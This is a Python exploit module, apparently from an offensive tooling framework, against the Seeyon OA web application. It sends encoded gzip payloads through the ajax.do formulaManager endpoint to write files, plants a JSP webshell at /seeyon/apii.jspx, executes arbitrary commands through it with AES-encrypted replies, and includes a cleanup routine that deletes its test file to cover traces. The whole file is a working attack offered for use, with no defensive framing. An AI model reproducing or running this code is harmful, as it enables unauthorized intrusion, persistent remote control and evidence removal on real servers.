from core.exploit import *
from core.payload import *
from core.utils import *


class SeeYon(Exploit):

    payload_wrapper = JspPayload()
    def __init__(self, url):
        self.url = url
        self.client = HttpClient(url)
        self.shell_uri = "/seeyon/apii.jspx"
        self.shell = "cmd"
        
    def check(self):
        payload = "%1F%C2%8B%08%00%00%00%00%00%00%C3%BFu%C2%91%5DO%C3%820%14%C2%86%C2%AF%C3%9D%C2%AFhv%C2%B3%11%C2%B1%C2%8B%13%C2%8D%C2%91p%21%C2%81%C2%91%C2%98l%7E%C3%80B%C2%82%C3%B1%C2%A2ngR%5D%C3%9Be%C3%ADd%C2%B0%C3%B0%C3%9F%C3%AD%C3%98%04%12%C2%B17%C3%A7%C2%A3%C3%A7%7D%C3%B2%C2%B6%C3%87x%C2%AD%C2%ACD%C3%A4%C2%ACH%C3%89l%C2%9D%C2%81u%C2%87.%C2%BB%C3%A8%C2%B7%13%10Vw%2C%05RY%C2%87%C3%B6%C2%B8%C3%8Cr%C2%90%C2%92%0A%5E_NUN%C3%B9%07%C3%8A%C2%88Z%C2%A2%0121vV%C3%B0N%C2%B2L%3A%12%60-%C2%B8c%C3%B6%0D%C3%94%C2%9C%C2%B3O%C3%B2M0%15%C3%B8IK%C3%94%3C%C2%A7%0Ar%C2%94%1DrW%038%C2%AC%C3%90%C2%891%C2%BB%C3%A6%C2%9F%C2%9B%C2%94%27%02%C2%ABR%C2%99%C2%9D%3D%14%C2%B5%06%C3%A4%12%C3%92%C2%B4v%C3%B08%7Fa%C3%BE%26%5E.%C2%98%7F%15%C2%B8%0F_%C2%8BQ%C3%98%C3%B3%C3%99%C3%B3%C2%B5%3F%C3%B1%C3%92%05%C3%B3X0%097%C3%81%C3%9Cw%7D7%1C%C2%98%7B%C2%8A%2C8fTFxx%3F%1D%C3%9F%C3%B4F%10%C2%89X%C2%BB%C2%8B%C3%9B%C3%98%18%3B%3Dd%C3%BF5%C3%93%C3%88%C3%9A%C2%A2%C3%916%C2%85%C3%9D%02q%13%C2%87E%C2%92h%C3%80%C3%8E%7B%C2%A7k%C2%863%C3%AF%C3%A2%C3%B6%C3%B8m%C3%87%C2%9F%C2%83wE%C3%8A%C3%ADc%C3%B8%7F%C2%B3Q*%24hc%C3%9B%7E%C2%BD%3C%C2%9D%C3%84%C2%90+%C2%A9%C2%88%C2%A2%11*%C3%8B%C3%92%C3%AET%C3%96VoTo%C2%B5%C2%AA%C2%A3%C3%8A%0B%C2%B0%C3%9E%C2%8C%1F%17%C3%97%C3%86%C3%98%0E%02%00%00"
        self.client.request("GET", "/seeyon/ajax.do;Jsessionid=getAjaxDataServlet?method=ajaxAction&managerMethod=validate&managerName=formulaManager&requestCompress=gzip&S=ajaxColManager&M=colDelLock&arguments=" + payload)
        response = self.client.request("GET", "/seeyon/info.txt")
        if response.status_code == 200:
            if "9df37afc77bdd582d90aefaf4e35c63e" in response.text:
                self.log("Test file write successful", "info")
                return True
        self.log("Failed to write to file", "error")
        return False
    
    def upload(self, webshell=True):
        if not webshell:
            payload = "%1F%C2%8B%08%00%00%00%00%00%00%C3%BFuT%C3%9Br%C2%A38%10%7D%C3%9E%7C%05%C3%A5%17%3B%C2%95Y%C2%82%C2%B1%3Dcf*%0F%C3%81%24%C2%B2%3D%06%C3%A3K%C2%90aj%1F%40R%40X%5C%C3%86%C3%9C%C2%9D%C2%9A%7F_a%3B%C2%97%C3%9A%C2%99%C2%A5%C2%8Aju%C2%A3%3E%7D%C3%BA%C2%A0%C3%96%C3%95%C2%8F%C2%97%C3%AEsr%C2%88%0A%C3%A6n%C2%9B%C2%94t%C2%BF%0A%C3%BDO%C3%82k%C3%84p%C2%A36%C3%92%C3%8DI%C2%96w%C3%9F%C3%83%0Fuz+YF%C2%93%C2%B8%C3%BD%C2%B8%C3%89%0F4%C3%B6%C2%85%C3%94%C3%8D%03%C3%A1N%C3%A8%C2%88%C3%A2mE%3C7M%C2%B3%C3%9B%C2%8C%C2%90%26%C2%89o%3B%C3%9F%C2%AE%C2%84%C3%B3%C3%B3W%C3%A8%C2%96%C2%AEH%13%C3%91%C3%A4%299%3C%C3%90%C2%9C%1C%C2%84%C3%B4%7D-s%C2%80%C2%98T%C3%82%1F%C2%B6%C3%B5Z%C3%BC%C2%9B%C2%8E%C2%9BR*%C2%86YZw%C2%AE%C3%9FP%C2%85%0B%C2%83%2C+%C2%8C%C2%B5%14%26a%C2%9D8%C3%B0qo%C3%BA%C3%89%C3%98%C2%83%C2%96do%C3%94%04O%C3%97%C3%95%02Z5%C2%86L67s%C3%8D%C2%93G%C2%92%03G%C3%92%C3%82Z%C2%8F%10x%C2%A23%60%C2%94%5E%C2%BCf%5E%C2%BCRf%C3%9C%C2%92%C3%A9%C2%AAt%C2%A7%C3%AB%C3%9C%C3%932%C3%9F%C2%96%C2%83%00%C3%85%06%C3%83Z%C3%9F%C2%B2%1E%C3%AC%7C9%C2%99%C3%9D%C3%B0%1AG%7B0O%C3%91t%C3%A5%C3%A3%29%C2%AB%C2%9C%C2%ADD1%C2%B0%C2%86x%C2%A2%C3%BC%C2%B4wN%C2%80d%C2%A3qw%C2%AA4%C2%A3j%C3%A8%C2%82%C3%87%06%C3%89%C2%96%C3%84%C3%AB%C2%BE%C3%A6%C3%BBh0%0F%C3%8D%C3%8D%C2%ACX%C3%88%C2%BC.%C3%AC%C2%97%1EU%7E%C2%A2F%C2%81z%C3%9F%2F%C3%9CX%C2%A7fX%C2%95%C2%AF%18%C2%A7%3E%00%2B%C3%9CFm%1CXq%7E%C2%86D%60%C3%8D%C2%90%1C0g%C2%B7%C2%A2%C2%B3%C3%A9%C2%A9%C2%877%C3%9E%C3%B6%C3%808%C3%B2%C2%BA%09%C2%8A%C2%AC%C3%A8%3F5B4%C3%90K%07X%C2%91%C2%BD%C2%B32%3C%19%C2%B5%3Em%C3%B11%60%C2%92%07%C2%9En%0C%C3%AD%5E2%27%C2%8A%C3%A4%C3%AE%C3%96%C2%99%C2%B3%1D%7E%C3%A7%C3%AB7-%C3%ADH%C3%99%C2%93%C2%8D%C3%9A%C3%B6%5Dz%C2%80%C3%B3%C2%88%1E%C3%BB%18%C2%8Cy%C3%BD3%1F%C3%9E%1F%C2%B5%C2%A1qp%C3%B8w%0CG%C3%BB%05%C3%A4u%C2%81%C3%92%2C%C3%A9%7D%C3%A8%C2%84A%C2%B4%C2%84N%C2%B0l%C2%B8v%C3%BE%7E%C3%AC%00%26%7F%C3%88%C2%ABl%C2%B8%C3%9E%C2%BBp%14%2Fv%C3%AB%12i%C2%89%C2%AFoQ%C2%85%C2%A6%C3%BE%C2%97%C2%B3%C2%A6%C3%BD%C2%80%C3%B7%1F%7Ba%C3%82%C3%BF%C2%85U%C3%B0Xs%C3%81%C2%99%C2%9B%C2%80%C3%A5N%C2%A3%1EQ%C2%A4%2B3%3A%2CmY%C3%89%3D%C2%A8%C3%B0%C2%9EYnC%C3%8CP3%C2%96tmU+0%C2%8A%C2%B9%26%17%1C%C2%89%C3%B3%C2%9C%1F%3D%C3%88%C3%B6%0E%C2%A8%C3%99%2C%1C%7E%C2%9F%C2%AC%7E%C3%A3%14%C2%B5g%C3%A4%C2%BD%07%C2%BD%C3%92%C2%B5%C3%BB%C3%B6%C3%BD%C3%A2DJ%C3%819%1D%C3%9D%5D%C3%8Axo%C2%B5%11%C2%AB%C3%83%C2%A5%C3%9C%0FP%C2%84%C3%93%C2%96%C2%A3%1E%C2%AA%15%C3%912j%C3%AEG%25%C2%9E%C2%A8%C3%80%1BX%C2%85%C2%A3Ue%C2%8B%C3%8Fu%C2%9CsM%C3%B7%C3%AE%C3%8E%C3%A6g%C2%A8*O%C2%9A%5Et%C3%86%C2%A0%C2%9F%C2%99%C3%BE%C3%9D%5D%C3%A7%C3%ADdgE%2CF4C%C2%A2z%C2%BFy%C3%B8%3C%C3%94%08J0%1F%19%7C%C2%B1%C3%A7i%C3%B9%C3%B3%C2%A6%C3%9E%C3%AF%03rN%C2%BB8%C3%A7%C3%9C%C2%B3%C3%93%C2%BB%00%C2%8Ag%C2%AB%16%C3%8F%C3%8F%1C%C3%A04O%C3%97%C2%9F%3AO%C3%9B%C3%87%C2%BF%C3%87%1F%C3%A7%C3%AD%C3%A3%C3%84%C2%8A%27%C2%87%C3%85%C2%BD%C2%8F%C3%A0%C3%BF%C2%B7%17%C2%B1%24%23%C2%9C%C3%98%C2%AFo%C3%AD%C2%8D%C3%82%17%C2%98%3C%0BY%C3%AE%C3%A6%14%09u%5D%C3%B7%C2%AE_%C2%BA%C2%BF%C3%B85%C3%83%C2%AF%C2%9A%C2%97%C3%96%C3%A6%C2%87%C2%82t%C3%BF%C2%B9%C3%BA%17+%C3%88%C2%8F%C2%9F%C2%A3%04%00%00"
        else:
            payload = "%1F%C2%8B%08%00%00%00%00%00%00%C3%BF%C2%A4V%5B%C2%93%C2%A2J%12~%C3%9E%C3%B9%15F%C2%BFtw%C3%8C%C2%AC%C2%83%28g%C3%86%C2%9D8%0F%C2%82Z%16%28%C2%AD%C3%90%14%C2%97%C2%8D%7D%C2%A0%C2%AAhn%C3%85e%04T%C2%9C8%C3%BF%7D%C2%A3DlwO%C3%AF%C3%8B%1E%23%0C%C2%A8%24%2B%C3%B3%C3%8B%C3%8C%2F%C2%B3%C3%AA%C3%93%3F%7F%3D%C2%BE%15%C3%BB%C2%ACa%C3%BEk%5B%06%C2%8F%C3%BF%18%C2%8C%C2%BE%0Cz%C2%89%C3%AEg%5C%C3%B2X%07U%C3%BD%C3%B8.%5E%C2%9C%C3%8A%7DPUq%C2%91%C3%B3%C2%8Ff%C2%BD%C2%8F%C3%B3pP%C3%BAu4%C3%B8%7D%C3%B00%1C~%3D%06%C3%98%2F%C3%8B%C3%AAk%15%04m%C2%91%7F%7D%C3%B8%C3%B1i%C3%90%C3%BD%C3%BE%C2%96%C3%B8%07%7F%18%17%C3%83%C3%AD%3E%C3%8Ek%7B%1F%C3%97%C3%81~P%C2%BE%C2%BF%C2%8B%C2%83%C3%9F%07yp%1C%7C%C2%A0%C3%B6%C3%84%C3%AD%7F~%C3%B0%C3%8B8%1E%26Uyzx%C2%BEY%1D%5C%11TQ%C3%80%18%C2%87%C2%B0%05%C3%A5%C2%99%C3%8C%C3%8B%16%C2%8BS%01%C2%AE%C2%A2%1A%03%C3%A9%C3%BC%C2%92q%C2%99%10%C3%BB%2BC+%C3%B3%C3%A2%C2%B0%16%C3%8B%C2%88f%C2%8B%C2%86%C2%8CQ%C2%B3%C3%8E%C3%B4%036%C2%A7%C2%9A5%C2%9A%1D%2C%C2%B0%C3%8C%3D%13%C2%864C-%11%C3%99%01%27B%C2%BC1%27-L%26%C3%9F%C3%BD%5C%3F%C2%BEdFI2%C2%94P%C3%80D%C3%8F%C2%94%C2%8E%C2%AEM%19%04%C2%AC%26%60%C3%9ARn%3F%5B%C2%8A%C2%AE%29%C2%8D%28%60%C3%95%3A.%C2%AA%C3%AB%C2%BA%C3%84%C3%AD%C3%A4%C3%A7%1Ap%C2%9F%C3%8B%C3%89%3A%C3%93%C3%9B%C3%80%C2%91%C2%85%C2%8Fe%C3%92%C2%99%00%C2%94%C3%9C%C3%AD%C2%AD%5C%5B%C3%8A%C3%97q%11%C2%AF%C3%8F%13%5DIN%3F%C3%89x%C3%B6%C2%9B%07P%C2%82%C3%81%C2%B2u%1D%C2%A3%C3%84%C3%A2%C3%A4%C3%B3%7CW%C3%B2%C3%B5%C2%99%C2%B42%C2%82%00M%28%40%C2%8D%C2%B7%C3%9A%C2%84%3B%C3%B1%14%C2%91%C2%B1%C2%BE%C3%81%C3%A22%C3%B5%1C%18%06GAS%C2%90U%C3%BC%C2%B7%C3%9Cm%C3%93%C3%AE%C3%9B%C2%8E%C2%9D%C2%A9%233%12G%C2%89%C3%B6Z%C3%A9J%C3%88%C2%A6%C3%B3%5D%C2%A1%C2%92%15%C2%8A1%60%09%5C%C3%A8%C2%95%C3%AB%C3%A8g%08H%C3%A1%C3%A6L%C3%B0PM%21%C2%80%25%5Cq%C3%9DT%25%19%12%C2%A8%C2%A36p%C2%A5%C2%8F%08%40%C3%AD%3A3%C2%98%C2%97%C2%B1%C3%86%C2%B3%C2%BA%7D%1A%C2%80%15%C2%9C%C3%8F%2A%08%60%C2%839%C3%86%C2%B1Q%C2%BC%C3%BB%29%C2%B9%C2%AF%C3%AFk%C3%B1R%C2%BF%C3%94%C2%B3%C3%B9%1E5%C2%A2%C2%80%C3%97%C3%A1%3Dv%22%C3%AA%C2%AD%C3%8Fs%05%C2%90%C2%B0%0D%05%C2%8D%C2%AET%C3%A9%C2%8A%C3%BD%C2%95%C2%AE%C3%94%12g%24%C3%B4E%24mM%28m%C3%A6r%C3%AC%C2%9E%C3%83%C2%89n%C3%AF%C3%86%C3%BA%C2%ABu%C3%9E%C2%9C%C3%89%08%267%C2%AC%27j%C2%A33U%C2%A4%C2%B3%C3%A7%182%5D%19%C2%ADo%C2%AB%23%0A%C2%AC%02%C3%A6%C3%BA%3E0a%05A%C3%8D%023%C3%BD%C3%86s%C2%A0+%5D+%3C%C2%96VN%5D%C3%87%C2%88%C2%B6%C2%8E%C3%8A%C2%88%C2%83%18%19%C3%AF%1AOD%C2%82%C2%95%C2%A1%C3%88%03%C2%A8%C3%95%C2%94%C2%B4%21%C3%BC%7Dq%2Aqf%5D%C3%A3KU%C3%9FvC%0D%18%11%05%C2%8Bhk%C3%8A%0D%C2%B5O%C2%95f%C3%8A%C2%9D%C3%AD%3B%C3%AC%C2%9C%7Bp.%C2%84%C3%96%C2%98%C2%9D%29%40%C3%B5%3A%C2%A3%C2%8C.%C3%A5%16%C2%8FeFrC%C3%92%14%C3%B5%C2%A7%C3%ABx%C3%91%3A%C3%B7%18%C3%89u%5E%C3%BF%C2%B8%C3%B7%C2%A1%C3%98%C2%AAD%01%C3%82%C2%8E%29%27X4%C3%98%C3%96%C2%96F%18%1C%2F%3E%C2%A02%0B%C2%BB%C2%BF%5Cz%C3%B1%C2%AC%C3%A0~.%C3%9Cw%C3%A4%C2%88d%C3%88%C3%82m%C3%88%C2%B9%3E%C2%81q%1An%13%21%C3%9C%28WN%C2%98%C3%BD%C2%BE%C3%AB%C2%BF%C3%A7%C3%80B%C2%8D%C2%88h%C2%89%C2%BA2%C2%9B%C3%B6%C2%B2u%C3%A6%1DH%2AE%C3%98%C2%B6%0A%C2%98u%3DF9G%15Iq%1D%C2%9D%C3%A9%C3%89%C2%AE%C3%87%C3%BA%C2%9F6%15y%C3%ABf%25s%C3%87%C2%BB%C3%90%C3%A0%C3%9C%16%0DFbn%C2%B7%C3%B7%21%C3%A5%C2%9Ec%C3%A8%C2%9Ec%14X%C3%9C%15%C2%90%C3%A7da0W%C2%9Cr%C3%BE%C3%86ke%C3%96s%1A%3Bf%1A%C3%A2%1CUXI%1B%C3%9F%C2%96D%2C%C3%96L%C2%BB%C3%999%C2%86%C3%9Ab%1A%C3%BB%C2%BC%C2%87%C2%975%C3%95%C3%BA%3A%7C%C2%8C%C3%A9%C2%82%C2%83%C3%97B%03%7D%5E%C3%93%3B%7C%17L%C3%B3%C2%AE%C3%AF%C3%82%C3%B2R%C2%A7%C3%85%C2%88Q%10%1D%3C%25%C2%8C%C2%BD%C2%AB%1E%C2%8C%C2%8F%21%C3%8E%C3%90%C2%B8%C3%8F%C2%91%3D%1A%7D%C3%AB%7Bg%C2%9Du%C2%B27%C3%B3%1E%C3%AB-%C2%AE%0A%02%C2%89%C3%91%C2%B6%C3%8F%C2%8D%C2%81%1D%C2%A7%C2%BEp%C2%AF%C3%B3u%C3%81t%C3%96%14%15%C2%A1%C2%85%5B%C2%BF%28%C2%B0%7C%C2%BBr%C3%B5.%C2%86%29%04%C2%A8%22%C2%A2%C3%B5%C3%97j%C2%99%C3%AB%23%1CK%C2%B5%C3%AF%C3%A8%C3%89%3AUeK%C2%B0D%C3%BD.%C3%BF%C3%BFgM%1B%C3%8F%C2%A1%2A%C3%8Eu%C3%81%C2%B5%C2%A5%C3%843%C3%83%C3%B2%C3%A5%23%C2%8C%40%3Fx%C3%80%0A%C2%B7%C3%A6%C3%AC6s4S%5Ex6%C2%97s%0E%C3%B3%5C%5C%C3%A7%C2%8B%C2%92%5Ez%C3%B1%C3%95F%C2%82%0F%C2%A6%C2%A9%C2%A6%C2%A8%C3%A9UO%C2%A1%C2%B6%C2%97u%5C%C2%91%1B%C3%8F%21%C3%A1%C2%8D%2FN%C3%9D%C3%B7%5E%C3%A3v%C2%B2%C2%A9%C3%86gv%C3%AE%1D%7C%C3%91%2A%C3%9E%C2%B1%C3%B7u%7C%C3%A7O+%C3%B2~%5EN%C3%BF%14%C3%BFJ%C3%A8%C3%BA%C3%91%C3%92K%02%22Fb9%C3%A1%3C%C3%9A%C2%89%C3%AC%C3%A8%C3%9F0%C2%B3%C2%86%C2%8C%C2%8D%08g%3A%C3%93%14U6%C3%90%C3%A6%C2%AE%C2%8F7%C2%9C%0F%25U%C3%82%C2%B6%C3%87k%C2%89%28%C3%A1%C3%B3%C3%95%14%C2%91d%C2%8De%C3%A6%C2%B6%C3%91%C3%9Es%C2%BAxw%3C%2F%C3%8E%C2%A6%C3%90%C3%8Cc%08%C3%93%C3%A5%C3%92ja%C3%B9n%C3%AB%C3%82%21%C2%A4%C2%AD%C2%8C%C3%82w6%C2%9D%C3%BE%25N%C2%AE%7F%C3%87a%C3%A1tpm%1EgXr%C2%B9%066%C2%8D%07%C2%A6%C3%80%C2%B7%C2%A5%08%2B%C3%91%25%07%C2%9A%C2%996%3C%07%C2%A6-%C2%9D%29X6%C2%AEhq%1B%7C%0EFx%C2%B5%29%08%3F%3F-%C3%BD%C2%80s%C2%83%05%C2%AB%5DW%C3%8F%5Dw%C2%86%C2%BC%C3%99zD%C2%81%5Eh%0B4qEt%C2%BC%C3%8C%C3%B5Xf%C2%9AS%C3%A9J.%7C%C2%BB%C2%9B%C3%BDgw%C2%AC%C2%96deT%C2%9E%C2%B3%C3%BB%7C%27%C2%BF%C2%9C%C3%A9%7C%C3%A6%3F%C3%9CN%C3%BF%C2%AA%C3%89%C2%87Y%5C%C2%91%C2%A1%3C3%17%C2%BFM%C3%A6%01%29h%C2%B0%1F%C3%90%C3%AB%C2%B3%C2%BBQ%7C%C2%AC%C3%B4%C3%B4%C3%A7KD%C2%B7%C3%AD%C2%BA%C3%A8%C3%B6v%C2%8B%C2%A7%C2%AB%C3%81a%C3%B7%C2%94%C2%9B%C2%B7%C2%B7%60%C3%BFt%C2%B9s%3C%7Fy%C2%B0%5E%C2%97%7F%C3%BF~%7F%27%C2%B9%C2%BF%C3%95%0C%2F%0B%C2%96%3F%C3%9D%1B%C3%BF_%C2%BA%C2%84%15U%C3%B0%C3%B4%C3%BC%C3%A3%C2%8F%1F%C3%BC%C3%96%C3%B5%C3%B4%C3%BC%C2%83%06o%C2%83%C2%AA%C3%B6%C3%AB%C2%98%0CN%C2%A7%C3%93%C3%93%C3%B3%C2%AF%C3%87%3F%C2%BE%0C%1E%1F%C2%BF%0C~%C3%B1g%C2%BDo%C2%82%C3%87%7F%7D%C3%BAw%00%00%00%C3%BF%C3%BF%0AB%C2%81%C3%97%C3%87%09%00%00"
        self.client.request("GET", "/seeyon/ajax.do;Jsessionid=getAjaxDataServlet?method=ajaxAction&managerMethod=validate&managerName=formulaManager&requestCompress=gzip&S=ajaxColManager&M=colDelLock&arguments=" + payload)
        reponse = self.client.request("GET", "/seeyon/apii.jspx")
        if reponse.status_code == 200:
            if not reponse.text:
                self.log("webshell upload success", "info")
                return ExploitStatus.SUCCESS
        self.log("webshell get fail, please check the payload or target environment", "error")
        return ExploitStatus.FAILED
    
    def attack(self, cmd):
        payload = self.payload_wrapper.generate(cmd, bin=self.shell)
        result = self.client.request("POST", self.shell_uri, data=payload)
        if result.status_code == 1000:
            self.log("Failed attack", "error")
        elif result.status_code == 200:
            self.log("Successful attack", "info")
            try:
                data = base64.b64decode(result.content)
                return AesDecrypt(b'sky', data)
            except:
                self.log("Failed to decrypt received data", "error")
        return b'error'

    def clean(self):
        self.attack("del /f ..\webapps\seeyon\info.txt")
        self.upload(False)

